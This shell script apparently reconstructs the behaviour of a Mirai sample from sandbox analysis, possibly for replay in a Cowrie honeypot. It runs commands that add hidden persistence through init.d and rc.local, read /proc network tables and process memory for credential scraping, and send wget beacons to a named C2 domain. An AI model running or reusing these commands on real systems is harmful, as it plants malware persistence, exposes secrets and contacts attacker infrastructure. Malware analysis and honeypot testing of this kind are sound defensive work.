#!/bin/sh
# =============================================================================
# RECONSTRUCTED MALWARE BEHAVIOUR — NOT THE ORIGINAL BINARY
# =============================================================================
# Family:       Mirai
# Architecture: MIPS big-endian (mips-msb)
# SHA256:       37f6367bbeec7391c1ab2df630399eca0e73b3b1c11a76174c2aa9235657e1fd
# Source:       MalwareBazaar
# Analysed via: tria.ge — debian-9-mips — score 6/10 dynamic / 10/10 static
# =============================================================================

# PHASE 1 - PERSISTENCE
# Observed: process tree shows cp wpa_supplicant /usr/bin/.sh
cp /proc/self/exe /usr/bin/.sh

# Observed: /etc/init.d/sysd dropped (25 bytes) — SysV init persistence
echo '#!/bin/sh' > /etc/init.d/sysd
echo '/usr/bin/.sh' >> /etc/init.d/sysd
chmod +x /etc/init.d/sysd

# Observed: rc script modification — second persistence mechanism
echo '/usr/bin/.sh &' >> /etc/rc.local

# PHASE 2 - DISCOVERY
# Observed: /proc/net reads (2 IoCs) — network enumeration
cat /proc/net/tcp
cat /proc/net/tcp6
cat /proc/net/if_inet6
cat /proc/net/ipv6_route

# Observed: /proc/[pid]/maps + /proc/[pid]/mem (64 IoCs) — credential scraping
# Loop unrolled: Cowrie does not support shell loop syntax
cat /proc/1/maps
cat /proc/1/mem
cat /proc/2/maps
cat /proc/2/mem
cat /proc/3/maps
cat /proc/3/mem
cat /proc/4/maps
cat /proc/4/mem
cat /proc/5/maps
cat /proc/5/mem
cat /proc/6/maps
cat /proc/6/mem
cat /proc/7/maps
cat /proc/7/mem
cat /proc/8/maps
cat /proc/8/mem

# PHASE 3 - C2 BEACON
# Observed: hundreds of DNS queries to asdfavae.duckdns.org
wget http://asdfavae.duckdns.org/report
wget http://asdfavae.duckdns.org/report
wget http://asdfavae.duckdns.org/report
